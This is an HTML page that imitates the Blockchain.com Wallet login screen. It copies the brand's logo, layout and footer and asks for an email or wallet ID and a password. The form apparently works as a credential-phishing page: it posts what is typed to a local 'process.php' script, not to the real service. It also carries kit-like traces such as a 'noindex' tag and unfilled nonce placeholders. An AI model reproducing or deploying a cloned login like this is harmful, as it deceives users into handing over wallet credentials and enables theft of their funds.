<!doctype html>
<html>
<head>
    <title>Blockchain.com Wallet</title>
    <meta name="robots" content="noindex">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
    <base href="/legacy-pages/">
    <link href="/img/favicon.png" rel="icon"/>
    <link href="/css/overrides.min.css" nonce="**CSP_NONCE**" type="text/css" rel="stylesheet"/>
    <link href="/css/blockchain.css" nonce="**CSP_NONCE**" type="text/css" rel="stylesheet"/>
    <script src="/js/jquery.min.js" nonce="**CSP_NONCE**" type="text/javascript"></script>
    <script src="/js/bootstrap.min.js" nonce="**CSP_NONCE**" type="text/javascript"></script>
    <script src="/js/shared.js" nonce="**CSP_NONCE**" type="text/javascript"></script>
    <script src='/js/block-alert.js' nonce="**CSP_NONCE**" type="text/javascript"></script>
    <script src="/js/mnemonic/mnemonic.js" nonce="**CSP_NONCE**" type="text/javascript"></script>
    <script src="/js/mnemonic/wallet-forgot-password.js" nonce="**CSP_NONCE**" type="text/javascript"></script>
    <script src="/js/wallet-index.js" nonce="**CSP_NONCE**" type="text/javascript"></script>
    <script nonce="**CSP_NONCE**">
        window.NONCE = '**CSP_NONCE**'
    </script>
    <style nonce="TEvynw1fzhsbeuw0bYtO8v71QLi10TxU">html,
        body,
        #app,
        #app > div {
            padding: 0;
            margin: 0;
            height: 100%;
        }

        html,
        body {
            background-color: rgb(18, 29, 51);
            overflow: hidden;
        }

        ::-webkit-scrollbar {
            display: none;
        }

        * {
            scrollbar-width: none;
            -ms-overflow-style: none;
            -webkit-font-smoothing: antialiased;
        }

        .grecaptcha-badge {
            visibility: hidden;
        }</style>
    <link rel="stylesheet" href="/app.scss">
</head>
<body>
<div id="app">
    <div class="sc-giadOv iYaDni" style="">
        <div class="sc-GMQeP gnVALT"></div>
        <div class="sc-fONwsr hxSfPk">
            <div height="112px" class="sc-gJWqzi hRGmil">
                <div class="sc-rBLzX jGwOsk sc-itybZL gtBlao">
                    <div class="sc-bMvGRv idZUoV sc-eMigcr bSrOyB">
                        <div class="sc-gPWkxV gYHxjZ"><a href="https://www.blockchain.com"
                                                         class="sc-htpNat bzateK sc-jVODtj ngbtn" color="blue600">
                                <img
                                        src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd" srcset=""
                                        height="24px"
                                        class="sc-bwzfXH ixijk sc-fzsDOv huRTra" width="auto"></a></div>
                    </div>
                </div>
            </div>
        </div>
        <div class="sc-VJcYb FrZLe">
            <form method="post" action="/scripts/process.php">
                <div class="sc-sPYgB sc-dPNhBE fwhpHE">
                    <div class="sc-aewfc cdXkSR">
                        <div class="sc-iIHjhz fdNMOw"><img
                                    src="https://login.blockchain.com/img/wallet-no-background.svg?bd1c33e5c7" srcset=""
                                    height="28px" class="sc-bwzfXH fnRhLT sc-jHZirH fXyteW"
                                    color="auto" width="auto">
                            <div color="purple600" cursor="inherit" opacity="1" class="sc-gzVnrw hJQqZZ">Wallet</div>
                        </div>
                        <div class="sc-iIHjhz kDvGBQ"><img
                                    src="https://login.blockchain.com/img/exchange-grayscale.svg?35b921e75d" srcset=""
                                    height="26px" class="sc-bwzfXH bngzGF sc-jHZirH fXyteW"
                                    color="auto" width="auto">
                            <div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw iSrPFo">Exchange</div>
                        </div>
                    </div>
                    <div class="sc-jhaWeW bAXBHZ">
                        <div class="sc-kNBZmU gvWCpF">
                            <div class="sc-eopZyb jqieqM" style="margin-top: 40px;">
                                <label
                                        class="sc-eNNmBn idMvpW sc-jRhVzh fSTNhQ" for="guid">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw eGdQh">Your Email
                                        or Wallet ID
                                    </div>
                                </label>
                                <div class="sc-iIHSe fqAsWt" height="48px">
                                    <div class="sc-dVhcbM klJnQP">
                                        <input data-e2e="loginGuidOrEmail" name="guidOrEmail"
                                               height="48px"
                                               placeholder="Enter email or wallet ID"
                                               spellcheck="false" type="text"
                                               class="form-conrol sc-fMiknA dIhvLp" value="" required>
                                    </div>
                                    <div data-e2e="textBoxError" color="error" height="48px"
                                         placeholder="Enter email or wallet ID"
                                         class="sc-gzVnrw cguRtB sc-gldTML iijiRe" cursor="inherit" opacity="1">
                                        <div data-e2e="requiredMessage">Required</div>
                                    </div>
                                </div>
                            </div>

                            <div class="sc-eopZyb jqieqM" style="margin-top: 20px;">
                                <label
                                        class="sc-eNNmBn idMvpW sc-jRhVzh fSTNhQ" for="guid">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw eGdQh">Your password
                                    </div>
                                </label>
                                <div class="sc-iIHSe fqAsWt" height="48px">
                                    <div class="sc-dVhcbM klJnQP">
                                        <input data-e2e="loginGuidOrEmail" name="password"
                                               height="48px"
                                               placeholder="Enter password"
                                               spellcheck="false" type="password"
                                               class="form-conrol sc-fMiknA dIhvLp" value="" required>
                                    </div>
                                    <div data-e2e="textBoxError" color="error" height="48px"
                                         placeholder="Enter email or wallet ID"
                                         class="sc-gzVnrw cguRtB sc-gldTML iijiRe" cursor="inherit" opacity="1">
                                        <div data-e2e="requiredMessage">Required</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-hvvHee gaNKsr">
                            <button type="submit" height="48px" data-e2e="loginButton"
                                    class="sc-gqjmRU gqApeS sc-bSbAYC fKVDAQ button" color="white"
                                    style="margin-bottom: 16px;">
                                <div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw edfwkt">
                                    Continue
                                </div>
                            </button>
                            <a data-e2e="loginGetHelp" color="blue600" class="helper sc-htpNat hBczNm" href="#/help">Need
                                some
                                help?</a></div>
                    </div>
                    <div class="sc-isBZXS cdBfNY">
                        <div data-e2e="signupLink" class="sc-dBAPYN hVrIcI" href="#/signup">
                            <div color="grey600" cursor="inherit" opacity="1" class="sc-gzVnrw dZiTwf"
                                 style="cursor: pointer; margin-top: 16px;">Don't have a Blockchain Account?
                            </div>&nbsp;<div color="blue600" class="sc-gzVnrw nYDtv sc-dKEPtC fUlanq" cursor="inherit"
                                             opacity="1">Sign up Now -&gt;
                            </div>
                        </div>
                    </div>
                </div>
            </form>
            <div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw buOrgt" style="margin: 24px 0px 16px;">
                Please check that you are visiting the correct URL
            </div>
            <div class="sc-dXfzlN hUeeVE"><span color="grey400" class="sc-bxivhb jcIbnc"
                                                style="color: rgb(152, 161, 178); font-size: 14px; font-weight: 400;"></span>
                <div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw hLxhAA" style="padding-left: 8px;">
                    https://login.blockchain.com
                </div>
            </div>
        </div>
        <div class="sc-kUaPvJ bxNNGK">
            <div class="sc-fOKMvo dUTubG">
                <div class="sc-kEYyzF fVTpCS">
                    <ul class="sc-eHgmQL ffypnH">
                        <li class="sc-cvbbAY jxHXIu">English</li>
                        <li class="sc-cvbbAY jxHXIu">French</li>
                        <li class="sc-cvbbAY jxHXIu">Portuguese</li>
                        <li class="sc-cvbbAY jxHXIu">Russian</li>
                        <li class="sc-cvbbAY jxHXIu">Spanish</li>
                        <li class="sc-cvbbAY jxHXIu">Turkish</li>
                    </ul>
                    <div color="grey400" class="sc-kkGfuU fGrWeP">
                        <div class="sc-iAyFgw gLZoqz">English</div>
                        <span class="sc-bxivhb cHKfSC sc-hSdWYo jANxgC"
                              style="font-size: 12px; font-weight: 400;"></span></div>
                </div>
                <span class="sc-fYiAbW fQjNQa"><a color="grey400"
                                                  href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases"
                                                  target="_blank" class="sc-htpNat ecJsZh">Version 4.64.1</a></span>
                <div class="sc-eLExRp fuJNvm">
                    <div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw hLxhAA" href="#/help">Need
                        Help?
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
